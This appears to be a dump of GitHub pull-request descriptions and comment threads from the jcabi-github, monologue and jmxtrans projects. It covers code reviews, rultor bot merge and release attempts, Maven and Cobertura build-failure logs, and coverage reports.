This requires updating a lot of test code since testcases create lots of temporary repos.","['@cvrebert Let me find a reviewer for this pull request, thanks for submitting it', '@pinaf please review, thanks', '@cvrebert even though this PR is rather long, I really like what it does to the code :)', '@cvrebert 10 comments above.', '@pinaf Responded to all your comments.', '@cvrebert thanks. 1 comment above.', '@pinaf Done. Addressed that comment.', '@rultor merge\r\n@cvrebert thank you', '> @rultor merge\r @cvrebert thank you\n\n@pinaf Thanks for your request. @yegor256 Please confirm this.', '@yegor256 Please try merging? Hopefully this will have better luck than the other PR.', '@yegor256 Please review+merge this.', '@rultor try to merge again', ""> @rultor try to merge again\n\n@yegor256 OK, I'll try to merge now. You can check the progress of the merge [here](http://www.rultor.com/t/3948-106919815)"", '> @rultor try to merge again\n\n@yegor256 Oops, I failed. You can see the full log [here](http://www.rultor.com/t/3948-106919815) (spent 6min)\n\n```\n[INFO] [INFO] Finished at: 2015-05-29T20:07:59+00:00\n[INFO] [INFO] Final Memory: 18M/276M\n[INFO] [INFO] ------------------------------------------------------------------------\n[INFO] [WARNING] The requested profile ""qulice"" could not be activated because it does not exist.\n[INFO] ..SUCCESS (7.1 s)\n[INFO] -------------------------------------------------\n[INFO] Build Summary:\n[INFO]   Passed: 2, Failed: 0, Errors: 0, Skipped: 0\n[INFO] -------------------------------------------------\n[INFO] \n[INFO] --- maven-failsafe-plugin:2.17:verify (default) @ jcabi-github ---\n[INFO] Failsafe report directory: /home/r/repo/target/failsafe-reports\n[INFO] ------------------------------------------------------------------------\n[INFO] BUILD FAILURE\n[INFO] ------------------------------------------------------------------------\n[INFO] Total time: 01:40 min\n[INFO] Finished at: 2015-05-29T20:07:59+00:00\n[INFO] Final Memory: 46M/462M\n[INFO] ------------------------------------------------------------------------\n[ERROR] Failed to execute goal org.apache.maven.plugins:maven-failsafe-plugin:2.17:verify (default) on project jcabi-github: There are test failures.\n[ERROR] \n[ERROR] Please refer to /home/r/repo/target/failsafe-reports for the individual test results.\n[ERROR] -> [Help 1]\norg.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal org.apache.maven.plugins:maven-failsafe-plugin:2.17:verify (default) on project jcabi-github: There are test failures.\n\nPlease refer to /home/r/repo/target/failsafe-reports for the individual test results.\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:212)\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153)\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145)\n\tat org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:116)\n\tat org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:80)\n\tat org.apache.maven.lifecycle.internal.builder.singlethreaded.SingleThreadedBuilder.build(SingleThreadedBuilder.java:51)\n\tat org.apache.maven.lifecycle.internal.LifecycleStarter.execute(LifecycleStarter.java:120)\n\tat org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:347)\n\tat org.apache.maven.DefaultMaven.execute(DefaultMaven.java:154)\n\tat org.apache.maven.cli.MavenCli.execute(MavenCli.java:584)\n\tat org.apache.maven.cli.MavenCli.doMain(MavenCli.java:213)\n\tat org.apache.maven.cli.MavenCli.main(MavenCli.java:157)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n\tat java.lang.reflect.Method.invoke(Method.java:606)\n\tat org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:289)\n\tat org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:229)\n\tat org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:415)\n\tat org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:356)\nCaused by: org.apache.maven.plugin.MojoFailureException: There are test failures.\n\nPlease refer to /home/r/repo/target/failsafe-reports for the individual test results.\n\tat org.apache.maven.plugin.surefire.SurefireHelper.reportExecution(SurefireHelper.java:82)\n\tat org.apache.maven.plugin.failsafe.VerifyMojo.execute(VerifyMojo.java:194)\n\tat org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo(DefaultBuildPluginManager.java:132)\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:208)\n\t... 19 more\n[ERROR] \n[ERROR] Re-run Maven using the -X switch to enable full debug logging.\n[ERROR] \n[ERROR] For more information about the errors and possible solutions, please read the following articles:\n[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException\n\n```', '@rultor merge again', '@yegor256 github error 500 - unrelated', '> @rultor merge again\n\n@pinaf Thanks for your request. @yegor256 Please confirm this.', '@yegor256 Maybe we could use RetryWire for RtMilestonesITCase since GitHub seems to be flaky on it?', '@cvrebert yes, good idea, can you do it in this branch?', '@yegor256 Done. Please retry merge.', '@yegor256 Please merge.', '@rultor merge', '> @rultor merge\n\n@pinaf Thanks for your request. @yegor256 Please confirm this.', '@rultor merge', ""> @rultor merge\n\n@yegor256 OK, I'll try to merge now. You can check the progress of the merge [here](http://www.rultor.com/t/3948-107677485)"", '> @rultor merge\n\n@yegor256 Done! FYI, the full log is [here](http://www.rultor.com/t/3948-107677485) (took me 9min)', ""@pinaf **22 mins** added to your account (payment number `AP-81V683464X307641P`), many thanks for your contribution! 141 hours and 2 mins spent here.. you're getting extra minutes here (c=7). +22 to your rating, your total score is [+7744](http://www.netbout.com/b/35128?open=rating)"", '@rultor deploy now pls', ""> @rultor deploy now pls\n\n@dmarkov OK, I'll try to deploy now. You can check the progress [here](http://www.rultor.com/t/3948-108786716)"", '> @rultor deploy now pls\n\n@dmarkov Done! FYI, the full log is [here](http://www.rultor.com/t/3948-108786716) (took me 10min)']"
297,jcabi/jcabi-github,1131.0,This adds the Status API tests promised in https://github.com/jcabi/jcabi-github/pull/1127#discussion_r32581107 and requested in https://github.com/jcabi/jcabi-github/pull/1127#issuecomment-112611522,"['@cvrebert Thanks, I will find someone to review this PR soon', '@carlosmiranda please review, thanks', '@cvrebert A few comments above.', ""@carlosmiranda I've responded to all your comments."", '@cvrebert Thanks!', '@rultor merge', '> @rultor merge\n\n@carlosmiranda Thanks for your request. @yegor256 Please confirm this.', '@cvrebert removing `@Immutable` is a bad idea. We promise that all classes in the library are immutable and annotated this way. See how it\'s done in other classes, where we encapsulate ""JSON-like"" strings', '> See how it\'s done in other classes, where we encapsulate ""JSON-like"" strings\r\n\r\n@yegor256 Actually, FWICT, you just encapsulate *requests* for JSON, which means you re-fetch the JSON over the network every time you need to get an attribute from it. That\'s extremely inefficient. Can you suggest an **efficient** implementation approach, considering that `@Immutable` doesn\'t deem `JsonObject` to be immutable?\r\n(I think it\'s pretty unreasonable to for `@Immutable` to deem all interfaces without `@Immutable` to be mutable; that would require @teamed to control every immutable interface in existence, which is obviously absurd.)', '@yegor256 So, do you have any efficient implementation suggestion? (See previous post.)', '@cvrebert we can encapsulate `String` instead of `JsonObject`...', '@yegor256 Okay, done: 4277a646c2c4bc8ecefc0c9bab62485fd4bc05ed\r\nStill wasteful CPU-wise but at least not network-wise.', '@rultor try to merge', ""> @rultor try to merge\n\n@yegor256 OK, I'll try to merge now. You can check the progress of the merge [here](http://www.rultor.com/t/4233-114271419)"", '> @rultor try to merge\n\n@yegor256 Done! FYI, the full log is [here](http://www.rultor.com/t/4233-114271419) (took me 9min)', '@yegor256 Thanks! Would you be able to tag a 0.24 release soon?', '@rultor release, tag is `0.24`', '> @rultor release, tag is `0.24`\n\n@yegor256 OK, I will release it now. Please check the progress [here](http://www.rultor.com/t/4233-114274563)', '> @rultor release, tag is `0.24`\n\n@yegor256 Oops, I failed. You can see the full log [here](http://www.rultor.com/t/4233-114274563) (spent 10min)\n\n```\n[ERROR] -> [Help 1]\norg.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal org.apache.maven.plugins:maven-site-plugin:3.4:site (default-site) on project jcabi-github: failed to get report for org.codehaus.mojo:cobertura-maven-plugin\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:216)\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153)\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145)\n\tat org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:116)\n\tat org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:80)\n\tat org.apache.maven.lifecycle.internal.builder.singlethreaded.SingleThreadedBuilder.build(SingleThreadedBuilder.java:51)\n\tat org.apache.maven.lifecycle.internal.LifecycleStarter.execute(LifecycleStarter.java:120)\n\tat org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:347)\n\tat org.apache.maven.DefaultMaven.execute(DefaultMaven.java:154)\n\tat org.apache.maven.cli.MavenCli.execute(MavenCli.java:584)\n\tat org.apache.maven.cli.MavenCli.doMain(MavenCli.java:213)\n\tat org.apache.maven.cli.MavenCli.main(MavenCli.java:157)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n\tat java.lang.reflect.Method.invoke(Method.java:606)\n\tat org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:289)\n\tat org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:229)\n\tat org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:415)\n\tat org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:356)\nCaused by: org.apache.maven.plugin.MojoExecutionException: failed to get report for org.codehaus.mojo:cobertura-maven-plugin\n\tat org.apache.maven.reporting.exec.DefaultMavenReportExecutor.buildMavenReports(DefaultMavenReportExecutor.java:156)\n\tat org.apache.maven.plugins.site.render.AbstractSiteRenderingMojo.getReports(AbstractSiteRenderingMojo.java:239)\n\tat org.apache.maven.plugins.site.render.SiteMojo.execute(SiteMojo.java:124)\n\tat org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo(DefaultBuildPluginManager.java:132)\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:208)\n\t... 19 more\nCaused by: org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project jcabi-github: Compilation failure\n/home/r/repo/src/test/java/com/jcabi/github/StatusesTest.java:[77,45] cannot access com.jcabi.github.Status.State\n  bad class file: /home/r/repo/target/generated-classes/cobertura/com/jcabi/github/Status$State.class\n    bad RuntimeInvisibleParameterAnnotations attribute: State(java.lang.String)\n    Please remove or make sure it appears in the correct subdirectory of the classpath.\n\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:212)\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153)\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145)\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.executeForkedExecutions(MojoExecutor.java:364)\n\tat org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeForkedExecutions(DefaultLifecycleExecutor.java:173)\n\tat org.apache.maven.reporting.exec.DefaultMavenReportExecutor.buildReportPlugin(DefaultMavenReportExecutor.java:309)\n\tat org.apache.maven.reporting.exec.DefaultMavenReportExecutor.buildMavenReports(DefaultMavenReportExecutor.java:151)\n\t... 23 more\nCaused by: org.apache.maven.plugin.compiler.CompilationFailureException: Compilation failure\n/home/r/repo/src/test/java/com/jcabi/github/StatusesTest.java:[77,45] cannot access com.jcabi.github.Status.State\n  bad class file: /home/r/repo/target/generated-classes/cobertura/com/jcabi/github/Status$State.class\n    bad RuntimeInvisibleParameterAnnotations attribute: State(java.lang.String)\n    Please remove or make sure it appears in the correct subdirectory of the classpath.\n\n\tat org.apache.maven.plugin.compiler.AbstractCompilerMojo.execute(AbstractCompilerMojo.java:858)\n\tat org.apache.maven.plugin.compiler.TestCompilerMojo.execute(TestCompilerMojo.java:152)\n\tat org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo(DefaultBuildPluginManager.java:132)\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:208)\n\t... 29 more\n[ERROR] \n[ERROR] Re-run Maven using the -X switch to enable full debug logging.\n[ERROR] \n[ERROR] For more information about the errors and possible solutions, please read the following articles:\n[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoExecutionException\n\n```', '@cvrebert there is something wrong with Cobertura... can you take a look?', '@yegor256 Could be an old compiler problem. Try https://github.com/jcabi/jcabi-parent/pull/33', '@yegor256 Okay, please try releasing again now that the other PRs have been merged.', '@rultor release, tag is `0.24`', '> @rultor release, tag is `0.24`\n\n@yegor256 OK, I will release it now. Please check the progress [here](http://www.rultor.com/t/4233-114332813)', '> @rultor release, tag is `0.24`\n\n@yegor256 Oops, I failed. You can see the full log [here](http://www.rultor.com/t/4233-114332813) (spent 11min)\n\n```\n[ERROR] -> [Help 1]\norg.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal org.apache.maven.plugins:maven-site-plugin:3.4:site (default-site) on project jcabi-github: failed to get report for org.codehaus.mojo:cobertura-maven-plugin\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:216)\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153)\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145)\n\tat org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:116)\n\tat org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:80)\n\tat org.apache.maven.lifecycle.internal.builder.singlethreaded.SingleThreadedBuilder.build(SingleThreadedBuilder.java:51)\n\tat org.apache.maven.lifecycle.internal.LifecycleStarter.execute(LifecycleStarter.java:120)\n\tat org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:347)\n\tat org.apache.maven.DefaultMaven.execute(DefaultMaven.java:154)\n\tat org.apache.maven.cli.MavenCli.execute(MavenCli.java:584)\n\tat org.apache.maven.cli.MavenCli.doMain(MavenCli.java:213)\n\tat org.apache.maven.cli.MavenCli.main(MavenCli.java:157)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n\tat java.lang.reflect.Method.invoke(Method.java:606)\n\tat org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:289)\n\tat org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:229)\n\tat org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:415)\n\tat org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:356)\nCaused by: org.apache.maven.plugin.MojoExecutionException: failed to get report for org.codehaus.mojo:cobertura-maven-plugin\n\tat org.apache.maven.reporting.exec.DefaultMavenReportExecutor.buildMavenReports(DefaultMavenReportExecutor.java:156)\n\tat org.apache.maven.plugins.site.render.AbstractSiteRenderingMojo.getReports(AbstractSiteRenderingMojo.java:239)\n\tat org.apache.maven.plugins.site.render.SiteMojo.execute(SiteMojo.java:124)\n\tat org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo(DefaultBuildPluginManager.java:132)\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:208)\n\t... 19 more\nCaused by: org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.3:testCompile (default-testCompile) on project jcabi-github: Compilation failure\n/home/r/repo/src/test/java/com/jcabi/github/StatusesTest.java:[77,45] cannot access com.jcabi.github.Status.State\n  bad class file: /home/r/repo/target/generated-classes/cobertura/com/jcabi/github/Status$State.class\n    bad RuntimeInvisibleParameterAnnotations attribute: State(java.lang.String)\n    Please remove or make sure it appears in the correct subdirectory of the classpath.\n\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:212)\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153)\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145)\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.executeForkedExecutions(MojoExecutor.java:364)\n\tat org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeForkedExecutions(DefaultLifecycleExecutor.java:173)\n\tat org.apache.maven.reporting.exec.DefaultMavenReportExecutor.buildReportPlugin(DefaultMavenReportExecutor.java:309)\n\tat org.apache.maven.reporting.exec.DefaultMavenReportExecutor.buildMavenReports(DefaultMavenReportExecutor.java:151)\n\t... 23 more\nCaused by: org.apache.maven.plugin.compiler.CompilationFailureException: Compilation failure\n/home/r/repo/src/test/java/com/jcabi/github/StatusesTest.java:[77,45] cannot access com.jcabi.github.Status.State\n  bad class file: /home/r/repo/target/generated-classes/cobertura/com/jcabi/github/Status$State.class\n    bad RuntimeInvisibleParameterAnnotations attribute: State(java.lang.String)\n    Please remove or make sure it appears in the correct subdirectory of the classpath.\n\n\tat org.apache.maven.plugin.compiler.AbstractCompilerMojo.execute(AbstractCompilerMojo.java:911)\n\tat org.apache.maven.plugin.compiler.TestCompilerMojo.execute(TestCompilerMojo.java:153)\n\tat org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo(DefaultBuildPluginManager.java:132)\n\tat org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:208)\n\t... 29 more\n[ERROR] \n[ERROR] Re-run Maven using the -X switch to enable full debug logging.\n[ERROR] \n[ERROR] For more information about the errors and possible solutions, please read the following articles:\n[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoExecutionException\n\n```', ""@cvrebert did't help :( try to run `mvn clean install -Pcobertura` locally and you will see the problem"", '@yegor256 I will go without the tagged release then. Thanks for trying. Good luck with Cobertura.', '@cvrebert ehhh.... it\'s your code there :) I should have included Cobertura in the ""merge"" pipeline.. we would fail much earlier than. Are you sure you can\'t fix this problem?', ""@yegor256 I'll give it a shot. Try merging https://github.com/jcabi/jcabi-parent/pull/34 & https://github.com/jcabi/jcabi-parent/pull/35."", ""@yegor256 Interesting; `mvn clean install -Pcobertura` doesn't crash for me locally. Perhaps because I'm using Java 8. Could jcabi-github's rultor's Java be upgraded?""]"
298,jipiboily/monologue,208.0,"First step in better social experience
I created one template for each social media (facebook, twitter, g+ and pinterest)
Also social media are only displayed when information is available

Finally, I corrected the facebook template which was using some unknown app_id...... that is user specific and needs to be set per user!","['@jipiboily : Could you review . Thx', 'Failing build, few nitpicks, :+1: :grinning: ', 'Closes #206.', 'Failing build due to f$&@!g travis. So many false negative with this tool\r\nit\'s scary\r\nOn Aug 1, 2014 7:35 PM, ""Jean-Philippe Boily"" <notifications@github.com>\r\nwrote:\r\n\r\n> Failing build, few nitpicks, [image: :+1:][image: :grinning:]\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub\r\n> <https://github.com/jipiboily/monologue/pull/208#issuecomment-50945936>.\r\n>', '\n[![Coverage Status](https://coveralls.io/builds/1034509/badge)](https://coveralls.io/builds/1034509)\n\nCoverage remained the same when pulling **7c29d95b32a06721672ba67f122f4ba8faa799c8 on msevestre:pinterest** into **a9f7c2636d66e261c5f5d2cf2ed6d154f57c2cdd on jipiboily:master**.\n', ""Restarted th\xc3\xa9 build and it worked. Not sure it's Travis or Selenium + capybara-webkit....?"", 'Good to go unless you have something to add/change?', ""@msevestre I guess we can close this or is it still planned? It's been a year :)\r\n\r\nClosing, feel free to re-open."", ""Did you merged it? Problem was and still remains Travis\n\nOn Wed, Aug 12, 2015, 12:08 PM Jean-Philippe Boily <notifications@github.com>\nwrote:\n\n> @msevestre <https://github.com/msevestre> I guess we can close this or is\n> it still planned? It's been a year :)\n>\n> Closing, feel free to re-open.\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/jipiboily/monologue/pull/208#issuecomment-130357120>.\n>\n"", ""Nope, I did not.\n\n\n\n(null)\n\nOn Wed, Aug 12, 2015 at 12:46 PM, Michael Sevestre\n<notifications@github.com> wrote:\n\n> Did you merged it? Problem was and still remains Travis\n> On Wed, Aug 12, 2015, 12:08 PM Jean-Philippe Boily <notifications@github.com>\n> wrote:\n>> @msevestre <https://github.com/msevestre> I guess we can close this or is\n>> it still planned? It's been a year :)\n>>\n>> Closing, feel free to re-open.\n>>\n>> \xe2\x80\x94\n>> Reply to this email directly or view it on GitHub\n>> <https://github.com/jipiboily/monologue/pull/208#issuecomment-130357120>.\n>>\n> ---\n> Reply to this email directly or view it on GitHub:\n> https://github.com/jipiboily/monologue/pull/208#issuecomment-130366691"", ""Hum why not? The only piece missing was the merge wasn't it?\n\nOn Wed, Aug 12, 2015, 1:25 PM Jean-Philippe Boily <notifications@github.com>\nwrote:\n\n> Nope, I did not.\n>\n>\n>\n> (null)\n>\n> On Wed, Aug 12, 2015 at 12:46 PM, Michael Sevestre\n> <notifications@github.com> wrote:\n>\n> > Did you merged it? Problem was and still remains Travis\n> > On Wed, Aug 12, 2015, 12:08 PM Jean-Philippe Boily <\n> notifications@github.com>\n> > wrote:\n> >> @msevestre <https://github.com/msevestre> I guess we can close this or\n> is\n> >> it still planned? It's been a year :)\n> >>\n> >> Closing, feel free to re-open.\n> >>\n> >> \xe2\x80\x94\n> >> Reply to this email directly or view it on GitHub\n> >> <https://github.com/jipiboily/monologue/pull/208#issuecomment-130357120\n> >.\n> >>\n> > ---\n> > Reply to this email directly or view it on GitHub:\n> > https://github.com/jipiboily/monologue/pull/208#issuecomment-130366691\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/jipiboily/monologue/pull/208#issuecomment-130382659>.\n>\n"", 'I think it was not merging cleanly, re-opening.', '@msevestre yeah, conflicts that needs to be resolved.', 'ok will look at that. hard to dig into code after such a  long time \r\n', 'done. Simple conflict in configuration.rb']"
299,jipiboily/monologue,117.0,"Here we go: A little PR cleaning up some stuff mentioned in  #114 and #115
I also did #113 because I need it badly for one project

Let's discuss the changes if you wish
","[""not sure why the build is broken...i suspect a travis bug...I'll check it tomorrow"", 'Agree about the broken build, looks like a Travis bug.', 'Are you going to merge that PR or should I do the sass clean up first? Waiting for your instructions...', 'Thanks @msevestre !']"
300,jipiboily/monologue,226.0,Resolves #213 ,"['\n[![Coverage Status](https://coveralls.io/builds/1586786/badge)](https://coveralls.io/builds/1586786)\n\nCoverage increased (+0.06%) when pulling **2d0273f0aef027954868c10f7a07b34abfd7e801 on astephenb:213-tag-oriented-feeds** into **0ef9ed3f7ae12e5c71fa2d53505ebdc94ab8b4d6 on jipiboily:master**.\n', ""Hey @astephenb . Thanks for the work on that. That's awesome\r\nI will look at that PR next week and get back to you.\r\nCheers"", 'looking at it now!']"
301,jipiboily/monologue,248.0,"Hey, I made some changes to get Travis back to green.

There were some failing tests on application_helper_spec and I had to add responders 2.0 as a dependency for deprecation reasons.","['\n[![Coverage Status](https://coveralls.io/builds/2037147/badge)](https://coveralls.io/builds/2037147)\n\nCoverage remained the same at 87.88% when pulling **17587de8ad520136929c8878101c46bc22469f41 on nicolasiensen:master** into **183bd8b35a8a952d7d6cc6015abb48f46da466fd on jipiboily:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2037147/badge)](https://coveralls.io/builds/2037147)\n\nCoverage remained the same at 87.88% when pulling **17587de8ad520136929c8878101c46bc22469f41 on nicolasiensen:master** into **183bd8b35a8a952d7d6cc6015abb48f46da466fd on jipiboily:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2037147/badge)](https://coveralls.io/builds/2037147)\n\nCoverage remained the same at 87.88% when pulling **17587de8ad520136929c8878101c46bc22469f41 on nicolasiensen:master** into **183bd8b35a8a952d7d6cc6015abb48f46da466fd on jipiboily:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2037419/badge)](https://coveralls.io/builds/2037419)\n\nCoverage remained the same at 87.88% when pulling **42ca6a1982f3ce91fe61523821dc6800aeabd1cb on nicolasiensen:master** into **183bd8b35a8a952d7d6cc6015abb48f46da466fd on jipiboily:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2037419/badge)](https://coveralls.io/builds/2037419)\n\nCoverage remained the same at 87.88% when pulling **42ca6a1982f3ce91fe61523821dc6800aeabd1cb on nicolasiensen:master** into **183bd8b35a8a952d7d6cc6015abb48f46da466fd on jipiboily:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2037419/badge)](https://coveralls.io/builds/2037419)\n\nCoverage remained the same at 87.88% when pulling **42ca6a1982f3ce91fe61523821dc6800aeabd1cb on nicolasiensen:master** into **183bd8b35a8a952d7d6cc6015abb48f46da466fd on jipiboily:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2037419/badge)](https://coveralls.io/builds/2037419)\n\nCoverage remained the same at 87.88% when pulling **42ca6a1982f3ce91fe61523821dc6800aeabd1cb on nicolasiensen:master** into **183bd8b35a8a952d7d6cc6015abb48f46da466fd on jipiboily:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2037482/badge)](https://coveralls.io/builds/2037482)\n\nCoverage remained the same at 87.88% when pulling **467c8d8e6fe086d8bb48f7ca7deccc1cc4753253 on nicolasiensen:master** into **183bd8b35a8a952d7d6cc6015abb48f46da466fd on jipiboily:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2037482/badge)](https://coveralls.io/builds/2037482)\n\nCoverage remained the same at 87.88% when pulling **467c8d8e6fe086d8bb48f7ca7deccc1cc4753253 on nicolasiensen:master** into **183bd8b35a8a952d7d6cc6015abb48f46da466fd on jipiboily:master**.\n', 'Hey cool.\nThanks!!!!\nOn Mar 3, 2015 4:53 PM, ""N\xc3\xadcolas Iensen"" <notifications@github.com> wrote:\n\n> Hey, I made some changes to get Travis back to green.\n>\n> There were some failing tests on application_helper_spec and I had to add\n> responders 2.0 as a dependency for deprecation reasons.\n> ------------------------------\n> You can view, comment on, or merge this pull request online at:\n>\n>   https://github.com/jipiboily/monologue/pull/248\n> Commit Summary\n>\n>    - Fix testing dummy Gemfile\n>    - Fix application_helper tests\n>\n> File Changes\n>\n>    - *M* Gemfile\n>    <https://github.com/jipiboily/monologue/pull/248/files#diff-0> (1)\n>    - *M* monologue.gemspec\n>    <https://github.com/jipiboily/monologue/pull/248/files#diff-1> (1)\n>    - *M* spec/helpers/application_helper_spec.rb\n>    <https://github.com/jipiboily/monologue/pull/248/files#diff-2> (16)\n>\n> Patch Links:\n>\n>    - https://github.com/jipiboily/monologue/pull/248.patch\n>    - https://github.com/jipiboily/monologue/pull/248.diff\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/jipiboily/monologue/pull/248>.\n>\n', '\n[![Coverage Status](https://coveralls.io/builds/2037528/badge)](https://coveralls.io/builds/2037528)\n\nCoverage remained the same at 87.88% when pulling **467c8d8e6fe086d8bb48f7ca7deccc1cc4753253 on nicolasiensen:master** into **183bd8b35a8a952d7d6cc6015abb48f46da466fd on jipiboily:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2037528/badge)](https://coveralls.io/builds/2037528)\n\nCoverage remained the same at 87.88% when pulling **467c8d8e6fe086d8bb48f7ca7deccc1cc4753253 on nicolasiensen:master** into **183bd8b35a8a952d7d6cc6015abb48f46da466fd on jipiboily:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2037528/badge)](https://coveralls.io/builds/2037528)\n\nCoverage remained the same at 87.88% when pulling **467c8d8e6fe086d8bb48f7ca7deccc1cc4753253 on nicolasiensen:master** into **183bd8b35a8a952d7d6cc6015abb48f46da466fd on jipiboily:master**.\n', 'Thanks']"
302,jipiboily/monologue,258.0,"I've changed how tag frequency of each tag is calculated. Before, for each tag a COUNT sql query was performed. That was highly inefficient. With this pull, one query calculates frequency for all tags improving drastically the performance.","['\n[![Coverage Status](https://coveralls.io/builds/2507342/badge)](https://coveralls.io/builds/2507342)\n\nCoverage decreased (-4.55%) to 83.33% when pulling **f4041f3952b25475ca4b6743c49c587cf819395a on jcarreti:tag_frequency_performance** into **183bd8b35a8a952d7d6cc6015abb48f46da466fd on jipiboily:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2507342/badge)](https://coveralls.io/builds/2507342)\n\nCoverage decreased (-4.55%) to 83.33% when pulling **f4041f3952b25475ca4b6743c49c587cf819395a on jcarreti:tag_frequency_performance** into **183bd8b35a8a952d7d6cc6015abb48f46da466fd on jipiboily:master**.\n', 'thanks', '@jcarreti unfortunaltey a test is failing. I think your implementation does not filter out posts that are not published. Can you resubmit and fix the failing test? Thanks']"
303,jmxtrans/jmxtrans,300.0,"And eliminate LifecycleExceptions where possible.
Most of the code and tests is borrowed from GraphiteWriter that trust connection handling to GenericKeyedObjectPool. Prior implementation was throwing LifecycleExceptions on innocent things like refused connections.
